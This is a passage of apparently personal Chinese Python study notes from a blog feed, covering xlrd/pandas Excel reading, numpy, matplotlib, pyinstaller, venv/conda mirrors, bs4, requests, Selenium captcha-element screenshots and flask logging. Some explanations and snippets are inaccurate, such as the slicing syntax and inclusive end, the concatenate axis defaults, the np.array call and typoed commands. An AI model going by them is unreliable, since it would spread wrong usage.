<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sheet1 = example.sheet_by_index(<span class="number">0</span>) <span class="comment">#通过索引获取表格，类似数组下标</span></span><br><span class="line">sheet2 = example.sheet_by_name(<span class="string">&#x27;价格&#x27;</span>)<span class="comment">#通过名称获取表格</span></span><br><span class="line">sheet1.ncols<span class="comment">#列数</span></span><br><span class="line">sheet1.nrows<span class="comment">#行数</span></span><br><span class="line">rows_value = sheet1.row_values(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#[&#x27;微软&#x27;, &#x27;python工程师2&#x27;, &#x27;2@2.com&#x27;]</span></span><br><span class="line">cols_value = sheet1.col_values(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#[&#x27;对方邮箱&#x27;, &#x27;1@1.com&#x27;, &#x27;2@2.com&#x27;, &#x27;3@3.com&#x27;]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sheet1.nrows):</span><br><span class="line">    <span class="built_in">print</span> (sheet1.row_values(i))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; 输出每一行，列表</span></span><br><span class="line"><span class="string">[&#x27;阿里巴巴&#x27;, &#x27;python工程师&#x27;, &#x27;1@1.com&#x27;]</span></span><br><span class="line"><span class="string">[&#x27;微软&#x27;, &#x27;python工程师2&#x27;, &#x27;2@2.com&#x27;]</span></span><br><span class="line"><span class="string">[&#x27;谷歌&#x27;, &#x27;python工程师3&#x27;, &#x27;3@3.com&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#使用单元格定位</span></span><br><span class="line">cell_A1 = sheet1.cell(<span class="number">0</span>,<span class="number">0</span>).value</span><br><span class="line">cell_A2 = sheet1.cell(<span class="number">0</span>,<span class="number">1</span>).value</span><br></pre></td></tr></table></figure>

<h5 id="使用pandas"><a href="#使用pandas" class="headerlink" title="使用pandas"></a>使用pandas</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;file_destiantion&#x27;</span>)</span><br><span class="line"><span class="comment">#df=pd.read_excel(&#x27;lemon.xlsx&#x27;,sheet_name=&#x27;Sheet1&#x27;)#可以通过sheet_name来指定读取的sheet</span></span><br><span class="line"><span class="comment"># df=pd.read_excel(&#x27;lemon.xlsx&#x27;,sheet_name=0)#可以通过表单索引来指定读取的表单               </span></span><br><span class="line">data = df.head()<span class="comment">#前五行数据</span></span><br><span class="line"><span class="comment">#data=df.values#获取所有的数据,返回一个列表迭代器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">format</span>(data))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   a   b   c</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">1,2,3被称为是DataFrame的index属性</span></span><br><span class="line"><span class="string">a，b，c被称为是columns属性</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">nrows = df.index.size  <span class="comment"># 行数</span></span><br><span class="line">ncols = df.columns.size  <span class="comment"># 列数</span></span><br><span class="line">df.iloc[][] <span class="comment">#按照单元格取</span></span><br><span class="line">df.iloc[:,j].name <span class="comment">#按照切片取，这里是第j列的名称 usage[row:column]</span></span><br></pre></td></tr></table></figure>

















<hr>
<h2 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h2><p><code>import numpy as np</code></p>
<p>以下笔记均在导入numpy的情况下使用</p>
<h3 id="numpy数组"><a href="#numpy数组" class="headerlink" title="numpy数组"></a>numpy数组</h3><ul>
<li><p>从py列表创建数组</p>
<p><code>np.array([1,2,3,4,5,6])</code> </p>
<p>numpy中的array方法还有dtype意为datatype指定数组的数据类型</p>
</li>
</ul>
<p>![numpy data type](C:\Users\83487\Pictures\programmer path\numpy data type.jpg)</p>
<ul>
<li>利用numpy内建方法创建大规模数组</li>
</ul>
<ol>
<li><p>创建一个长度为10的数组，且赋予初值0</p>
<p><code>np.zeros(10,dtype = int)</code></p>
</li>
<li><p>创建一个3*5的浮点数数组，初值为1</p>
<p><code>np.ones( (3,5),dtype = float)</code></p>
</li>
<li><p>创建一个3*5的浮点数组，初值为3.14 </p>
<p><code>np.full((3,5),3.14)</code></p>
</li>
<li><p>创建一个3*5的浮点数组，从0-20，步长为2</p>
<p><code>np.arange(0,20,2)</code></p>
<p>out:[0,2,4,6,…20]</p>
</li>
<li><p>创建一个五个元素的数组，数值平均分配0-1中间</p>
<p><code>np.linspace(0,1,5)</code></p>
</li>
<li><p>创建一个3*3取值在0-1之间的矩阵，由随机数组成的数组</p>
<p><code>np.random.random((3,3))</code></p>
</li>
<li><p>创建一个正态分布，方差为1，3*3的随机数组</p>
<p><code>np.random.normal(0,1,(3,3))</code></p>
</li>
<li><p>创建一个3*3，[0,10)之间的随机数组</p>
<p><code>np.random.randint(0,10,(3,3))</code></p>
</li>
<li><p>创建一个3*3的单位矩阵</p>
<p><code>np.eye(3)</code></p>
</li>
<li><p>创建一个3个整形数组构成的数组，未初始化，直接读取内存的值</p>
<p><code>np.empty(3)</code></p>
<hr>
</li>
</ol>
<h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><p>每个数组均有<code>nidm</code>(数组的维度),<code>shape</code>(每个数组的大小),<code>size</code>(数组的总大小),<code>dtype</code>是数组的数据类型,<code>itemsize</code>每个数组元素字节大小，<code>nbytes</code>数组总字节大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment">#省略下区间的写法（0，10）=&gt; 10</span></span><br><span class="line">x1 = np.random.randint(<span class="number">10</span>,size = <span class="number">6</span>)<span class="comment">#一维 </span></span><br><span class="line">x2 = np.random.randint(<span class="number">10</span>,size = (<span class="number">3</span>,<span class="number">4</span>))<span class="comment">#二维</span></span><br><span class="line">x3 = np.random.randint(<span class="number">10</span>,size = (<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>))<span class="comment">#三维</span></span><br><span class="line">x3.ndim 	<span class="comment">#数组的维度 3</span></span><br><span class="line">x3.shape	<span class="comment">#每个数组的大小 (3,4,5)</span></span><br><span class="line">x3.size		<span class="comment">#数组的总大小  60 </span></span><br><span class="line">x3.dtype</span><br><span class="line">x3.itemsize <span class="comment">#每个数组元素字节大小 8bytes</span></span><br><span class="line">x3.nbytes	<span class="comment">#数组总字节大小   480bytes</span></span><br></pre></td></tr></table></figure>

<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><ol>
<li><p>若是数组名，则返回整个数组</p>
</li>
<li><p>第一个元素为0，可以使用负值，即为倒数第一个元素</p>
</li>
<li><p>在多维数组中可以用逗号分隔索引元素<code>[行，列]</code></p>
</li>
</ol>
<p>   tips:若将浮点数的值赋值给整形的numpy对象，会自动截取整数部分，自动进行，无错误和警告</p>
<h4 id="切分"><a href="#切分" class="headerlink" title="切分"></a>切分</h4><p>x是一个数组则，数据的切分为<code>x[start,stop,step]</code></p>
<p>值得注意的是，在一维数组中，<code>x[4,7]</code>这个切片表示的是原数组第5个元素（包括）到第七个元素（包括）</p>
<p>同样的负值在step中依旧可以使用，例如<code>x[::-1]</code>表示的是逆序输出原数组所有元素</p>
<ul>
<li><p>多维数组类似操作，不同维度之间用逗号分隔</p>
</li>
<li><p>获取行列。例如：获取二维数组x2第一行，<code>x2[0,:]</code>,或省略为<code>x2[0]</code></p>
<p>​                同理二维数组的x2第一列，<code>x2[:,0]</code></p>
</li>
<li><p>用上述的切分操作创建的是原数组的视图，即数据与原数组相关联，若改动某个元素的值，原数组中的该元素的值也被改变</p>
</li>
<li><p>若想切分出来的新数组与原数组无关，可以用<code>.copy()</code>函数进行转换，即创建一个原数组子副本usage：<code>x2.[:,0].copy()</code></p>
</li>
</ul>
<h4 id="变形与分裂"><a href="#变形与分裂" class="headerlink" title="变形与分裂"></a>变形与分裂</h4><h5 id="数组的变形"><a href="#数组的变形" class="headerlink" title="数组的变形"></a>数组的变形</h5><p>数组的变形可以用reshape() 函数和newaxis</p>
<p>![reshape](C:\Users\83487\Pictures\programmer path\reshape.jpg)</p>
<h5 id="数组的拼接和分裂"><a href="#数组的拼接和分裂" class="headerlink" title="数组的拼接和分裂"></a>数组的拼接和分裂</h5><h6 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">y = np.array([<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>])</span><br><span class="line">np.concatenate([x,y])</span><br><span class="line"><span class="comment">#out: array([1,2,3,3,2,1])</span></span><br></pre></td></tr></table></figure>

<p>concatenate也可以对二维数组和两个以上的数组对象进行拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grid = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">               	[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">np.concatenate([grid,grid])<span class="comment">#默认沿着第一个轴进行拼接，y轴</span></span><br><span class="line"><span class="comment">#缺省axis = 1</span></span><br></pre></td></tr></table></figure>

<p>输出结果np.array([1,2,3],</p>
<p>​                [4,5,6],</p>
<p>​                [1,2,3],</p>
<p>​                [4,5,6])</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grid = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">               	[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">np.concatenate([grid,grid],axis = <span class="number">0</span>)<span class="comment">#axis = 0,x轴拼接</span></span><br></pre></td></tr></table></figure>

<p>输出结果np.array([1,2,3],    [1,2,3],</p>
<p>​                [4,5,6],  [4,5,6])</p>
<ul>
<li>或者使用np.vstack,np.hstack</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grid = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">               	[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">np.vstack([grid,grid])<span class="comment">#效果等于concatenate按y轴拼接</span></span><br><span class="line">np.hstack([grid,grid])<span class="comment">#效果等于concatenate按x轴拼接</span></span><br></pre></td></tr></table></figure>

<h6 id="分裂"><a href="#分裂" class="headerlink" title="分裂"></a>分裂</h6><ul>
<li>np.split</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">x1,x2,x3 = np.split(x,[<span class="number">3</span>,<span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(x1,x2,x3)</span><br><span class="line"><span class="comment">#out : [1,2,3],[99,99],[3,2,1]</span></span><br></pre></td></tr></table></figure>

<p>分裂点是3，5，分裂点之前的（不含分裂点）为一组</p>
<ul>
<li>np.hsplit、np.vsplit </li>
</ul>
<p>![vsplit hsplit](C:\Users\83487\Pictures\programmer path\vsplit hsplit.jpg)</p>
<h3 id="numpy函数"><a href="#numpy函数" class="headerlink" title="numpy函数"></a><code>numpy</code>函数</h3><ul>
<li>数组值求和</li>
</ul>
<p><code>np.sum()</code>,<code>numpy</code>的函数比py内置的sum函数速度更快，括号中值是<code>numpy</code>的对象</p>
<ul>
<li>最大最小值</li>
</ul>
<p><code>numpy</code>中有最大最小和求和的函数，用<code>np_oject_name.min()</code>,<code>np_oject_name.max()</code>, <code>np_oject_name.sum()</code>来得到</p>
<p>还有一个参数便是axis，axis 关键字指定的是数组将会被折叠的维 度，而不是将要返回的维度。因此指定 axis=0 意味着第一个轴将要被折叠——对于二维数 组，这意味着每一列的值都将被聚合</p>
<p>例如现在一个叫做M的<code>numpy</code>对象，<code>M.min(axis=0)</code>则意味着数据被摊开为只有x轴，并找到其中的min，</p>
<p><code>numpy</code>支持的算术运算符，+，-，<em>，/，//(地板除)，</em>*(指数)，%(取余),</p>
<p>绝对值<code>np.abs()</code></p>
<p>三角函数<code>np.sin()</code>,<code>np.cos()</code>,<code>np.tan()</code></p>
<p>反三角函数<code>np.arcsin()</code>,<code>np.arccos()</code>,<code>np.arctan()</code></p>
<p>指数和对数 </p>
<p><code>np.exp(x)</code> - e^x</p>
<p><code>np.exp2(x)</code>-2^x</p>
<p><code>np.power(3,x)</code>-3^x</p>
<p><code>np.log(x)</code>- ln(x)</p>
<p><code>np.log2(x)</code>-log2(x)</p>
<p><code>np.log10(x)</code>-log10(x)</p>
<p>特殊版本</p>
<p><code>print(&quot;exp(x) - 1 =&quot;, np.expm1(x))</code> </p>
<p><code>print(&quot;log(1 + x) =&quot;, np.log1p(x))</code></p>
<ul>
<li>更高级的版本科学计算的函数可以在scipy.special中找到</li>
</ul>
<h3 id="高级的通用函数特性"><a href="#高级的通用函数特性" class="headerlink" title="高级的通用函数特性"></a>高级的通用函数特性</h3><ol>
<li>指定输出</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = np.arange(<span class="number">5</span>)</span><br><span class="line">y = np.empty(<span class="number">5</span>)</span><br><span class="line">np.multiply(x,<span class="number">10</span>,out = y)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment">#outs:[0. 10. 20. 30. 40.]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#another example</span></span><br><span class="line">y = np.zeros(<span class="number">10</span>)</span><br><span class="line">np.power(<span class="number">2</span>,x,out=y[::<span class="number">2</span>]) <span class="comment">#隔一个数字做乘方</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment">#[ 1. 0. 2. 0. 4. 0. 8. 0. 16. 0.]</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>聚合</li>
</ol>
<p>对于np.add调用reduce方法会返回所有的元素的和</p>
<p>对于np.multiply函数调用reduce会返回数组中所有元素的乘积</p>
<p>如果要存储每次计算中间结果，可以用accumulate,同样可以对add和multiply调用，但是返回的是一个np数组对象，在原来的基础上最后加上一个元素和或积</p>
<ol start="3">
<li>外积</li>
</ol>
<p>就像一个乘法表，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = np.arange(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">np.multiply.outer(x,x)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">[1,2,3,4,5]</span></span><br><span class="line"><span class="string">[2,4,6,8,10]</span></span><br><span class="line"><span class="string">[3,6,9,12,15]</span></span><br><span class="line"><span class="string">[4,8,12,16,20]</span></span><br><span class="line"><span class="string">[5,10,15,20,25]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>





<ol>
<li></li>
</ol>
<h2 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h2><p>matplotlib 是一个绘图库，创建的图形可达到出版的质量要求。它可以创建常用的统计 图，包括条形图、箱线图、折线图、散点图和直方图。它还有一些扩展工具箱，比如 basemap 和 cartopy，用于制作地图，以及 mplot3d，用于进行 3D 绘图。 matplotlib 提供了对图形各个部分进行定制的功能。例如，它可以设置图形的形状和大 小、x 轴与 y 轴的范围和标度、x 轴与 y 轴的刻度线和标签、图例以及图形的标题。你可以 参考一下 matplotlib 初学者指南和 <a href="http://matplotlib.org/users/beginner.html">API</a>，以获得 更多的关于定制图形的信息.</p>
<p>从一个</p>
<p>250 2172<br>500 4230<br>750 6344<br>1000 8404<br>1250 10448<br>1500 12541<br>1750 14587<br>2000 16727<br>2250 18835<br>2500 20840<br>2750 22925<br>3000 25001<br>3250 27093<br>3500 29182<br>3750 31227这样的文件中提取数据并且绘制散点图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置中文字体</span></span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;Microsoft YaHei&#x27;</span>]</span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;font.family&#x27;</span>]=<span class="string">&#x27;sans-serif&#x27;</span></span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\pycharm\gragh\/v3c.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    plots = csv.reader(csvfile, delimiter=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> plots:</span><br><span class="line">        x.append(<span class="built_in">int</span>(row[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(row[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.scatter(x,y, label=<span class="string">&#x27;散点&#x27;</span>, color=<span class="string">&#x27;g&#x27;</span>, s=<span class="number">25</span>, marker=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">plt.ylim(<span class="number">0</span>,<span class="number">1e8</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;问题规模n&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;执行次数(s)&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;v3散点图&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>







<h2 id="生成exe发布"><a href="#生成exe发布" class="headerlink" title="生成exe发布"></a>生成exe发布</h2><ul>
<li>pyinstaller</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyinstaller -F helloworld.py</span><br></pre></td></tr></table></figure>

<p>其中，<code>-F</code> 表示打包成单独的 .exe 文件，这时生成的 .exe 文件会比较大，而且运行速度回较慢。仅仅一个 helloworld 程序，生成的文件就 5MB 大。</p>
<p>另外，使用 <code>-i</code> 还可以指定可执行文件的图标； <code>-w</code> 表示去掉控制台窗口，给程序换图标的方法<br>输入命令中添加一个-i tubiao.ico(图标的相对路径)</p>
<h2 id="python使用虚拟环境"><a href="#python使用虚拟环境" class="headerlink" title="python使用虚拟环境"></a>python使用虚拟环境</h2><p><code>python3 -m venv envir_name</code>如果它不存在，这将创建 <code>tutorial-env</code> 目录，并在其中创建包含Python解释器，标准库和各种支持文件的副本的目录。</p>
<p><code>source 虚拟路径/bin/activate</code> 激活虚拟环境</p>
<p><code>deactivate</code>退出虚拟环境</p>
<h2 id="conda"><a href="#conda" class="headerlink" title="conda"></a>conda</h2><p>conda相当于virtualenv + pip环境,是一个包管理工具+虚拟环境的工具.不只支持python一个语言</p>
<ol>
<li><p>首先在所在系统中安装Anaconda。可以打开命令行输入<code>conda -V</code>检验是否安装以及当前<code>conda</code>的版本。</p>
</li>
<li><p>conda常用的命令</p>
<ol>
<li><code>conda list</code> 查看安装了哪些包。</li>
<li><code>conda env list</code> 或 <code>conda info -e</code> 查看当前存在哪些虚拟环境</li>
<li><code>conda update conda </code>检查更新当前<code>conda</code></li>
</ol>
</li>
<li><p><code>conda info --env</code>查看有哪些虚拟环境</p>
</li>
<li><p><strong>创建</strong>python虚拟环境。</p>
<p>使用 <code>conda create -n your_env_name python=X.X</code>（2.7、3.6等)命令创建python版本为X.X、名字为your_env_name的虚拟环境。<code>your_env_name</code>文件可以在Anaconda安装目录<code>envs</code>文件下找到。</p>
</li>
<li><p>使用<strong>激活</strong>(或切换不同python版本)的虚拟环境。</p>
</li>
</ol>
<p><code>conda activate env_name</code> </p>
<p>退出环境</p>
<p><code>conda deactivate</code></p>
<p>  打开命令行输入python –version可以检查当前python的版本。</p>
<p>  使用如下命令即可 激活你的虚拟环境(即将python的版本改变)。</p>
<p>  Linux: <code>source activate your_env_name</code>(虚拟环境名称)</p>
<p>  Windows: <code>activate your_env_name</code>(虚拟环境名称)</p>
<p>  这是再使用python –version可以检查当前python版本是否为想要的。</p>
<ol start="5">
<li>对虚拟环境中<strong>安装</strong>额外的<strong>包</strong>。</li>
</ol>
<p>  使用命令<code>conda install -n your_env_name [package]</code>即可安装package到<code>your_env_name</code>中</p>
<ol start="6">
<li><strong>关闭</strong>虚拟环境(即从当前环境退出返回使用PATH环境中的默认python版本)。</li>
</ol>
<p>  使用如下命令即可。</p>
<p>  Linux: source deactivate</p>
<p>  Windows: deactivate</p>
<ol start="7">
<li><strong>删除</strong>虚拟环境。</li>
</ol>
<p>  使用命令<code>conda remove -n your_env_name(虚拟环境名称) --all</code>， 即可删除。</p>
<ol start="8">
<li><strong>删除</strong>环境中的某个<strong>包</strong>。</li>
</ol>
<p>  使用命令<code>conda remove --name your_env_name package_name </code>即可。</p>
<p><code>conda</code>添加源</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line"><span class="comment"># 以上两条是Anaconda官方库的镜像</span></span><br><span class="line"></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line"><span class="comment"># 以上是Anaconda第三方库 Conda Forge的镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for linux</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br><span class="line"><span class="comment"># for legacy win-64</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/peterjc123/</span><br><span class="line">以上两条是Pytorch的Anaconda第三方镜像</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes  <span class="comment">#刷新源</span></span><br></pre></td></tr></table></figure>

<p><code>conda info</code>可以查看是否添加成功</p>
<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="bs4"><a href="#bs4" class="headerlink" title="bs4"></a>bs4</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup </span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(web_response.content,<span class="string">&quot;html.parser&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/">https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/</a></p>
<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">web = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)  <span class="comment">#向百度发起一次get请求，返回请求结果的实体类</span></span><br><span class="line"><span class="built_in">print</span>(web.status_code)    <span class="comment">#请求返回的状态码，200是OK，404是页面不存在，500是错误，更多自己百度搜索</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(web.content))    <span class="comment">#页面内容的数据类型是bytes，因此需要解码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(web.content.decode()))</span><br><span class="line"><span class="built_in">print</span>(web.content.decode())    <span class="comment">#解码之后，得到的页面内容是结构化的字符串</span></span><br></pre></td></tr></table></figure>



<h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment"># 可以进行chrome相关包的自动下载和管理</span></span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">element_screenshot</span>(<span class="params">element</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    截取部分截图,根据dom元素的id获取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pwd = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    os.chdir(pwd)</span><br><span class="line">    <span class="comment"># 截取全屏图片</span></span><br><span class="line">    <span class="comment"># driver.set_window_size(1920,1080)</span></span><br><span class="line">    driver.save_screenshot(<span class="string">&quot;../images/full.png&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取element的顶点坐标</span></span><br><span class="line">    x_Piont = element.location[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">    y_Piont = element.location[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(x_Piont + &quot; &quot; + y_Piont)</span></span><br><span class="line">    <span class="comment"># 获取element的宽、高</span></span><br><span class="line">    element_width = x_Piont + element.size[<span class="string">&#x27;width&#x27;</span>]</span><br><span class="line">    element_height = y_Piont + element.size[<span class="string">&#x27;height&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    picture = Image.<span class="built_in">open</span>(<span class="string">&quot;../images/full.png&quot;</span>)</span><br><span class="line">	<span class="comment"># 此处的125是缩放比,windows桌面右键-显示设置中的缩放比数值,只有除以(100/125)坐标才可以显示正常</span></span><br><span class="line">    picture = picture.crop((x_Piont/(<span class="number">100</span>/<span class="number">125.0</span>), y_Piont/(<span class="number">100</span>/<span class="number">125.0</span>), element_width/(<span class="number">100</span>/<span class="number">125.0</span>), element_height/(<span class="number">100</span>/<span class="number">125.0</span>)))</span><br><span class="line">    picture.save(<span class="string">&quot;../images/Capture.png&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 一个新的连接,如果找不到对应版本的驱动会自动安装 ,注意Chrome是大写字母开头</span></span><br><span class="line">driver = webdriver.Chrome(executable_path=ChromeDriverManager().install())</span><br><span class="line">driver.get(<span class="string">&quot;http://192.168.100.190//default2.aspx&quot;</span>)</span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 要截取的验证码元素</span></span><br><span class="line">element = driver.find_element_by_id(<span class="string">&quot;icode&quot;</span>)</span><br><span class="line"><span class="comment"># 调用element_screenshot()方法</span></span><br><span class="line">element_screenshot(element)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>xpath定位法</p>
<p>和本文档同一目录下的pdf</p>
</li>
</ul>
<h3 id="转中文问题"><a href="#转中文问题" class="headerlink" title="转中文问题"></a>转中文问题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line">json.dumps(需要转成json对象,ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>



<h3 id="在flask中使用log"><a href="#在flask中使用log" class="headerlink" title="在flask中使用log"></a>在flask中使用log</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">handler = logging.FileHandler(<span class="string">&#x27;flask.log&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">handler.setLevel(logging.DEBUG) <span class="comment"># 设置日志记录最低级别为DEBUG，低于DEBUG级别的日志记录会被忽略，不设置setLevel()则默认为NOTSET级别。</span></span><br><span class="line">logging_format = logging.Formatter(     </span><br><span class="line">    <span class="string">&#x27;%(asctime)s - %(levelname)s - %(filename)s - %(funcName)s - %(lineno)s - %(message)s&#x27;</span>)</span><br><span class="line">handler.setFormatter(logging_format)</span><br><span class="line">flask_app.logger.addHandler(handler)</span><br></pre></td></tr></table></figure>

<p><code>flask_app.logger.duebg()</code>即可记录flask</p>
<p>flask_app为flask实例    </p>
<h3 id="生成requirement-txt"><a href="#生成requirement-txt" class="headerlink" title="生成requirement.txt"></a>生成requirement.txt</h3><p><code>pip freezz &gt; requiremets.txt</code></p>
<p><code>pipreqs ./</code></p>
<h3 id="使用vscode导入相对路径"><a href="#使用vscode导入相对路径" class="headerlink" title="使用vscode导入相对路径"></a>使用vscode导入相对路径</h3><p>pycharm会自动添加项目根目录到工作路径，vscode 需要修改下配置文件,不然会no moudle error</p>
<p>在lau nch.json中添加</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;env&quot;</span>: &#123;<span class="attr">&quot;PYTHONPATH&quot;</span>:<span class="string">&quot;$&#123;workspaceRoot&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>基础语法</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>京东k2键盘linux下使用f1-12键</title>
    <url>/2022/02/20/%E4%BA%AC%E4%B8%9Ck2%E9%94%AE%E7%9B%98linux%E4%B8%8B%E4%BD%BF%E7%94%A8f1-12%E9%94%AE/</url>
    <content><![CDATA[<p>京东k2键盘linux下使用f1-12键</p>
<span id="more"></span>
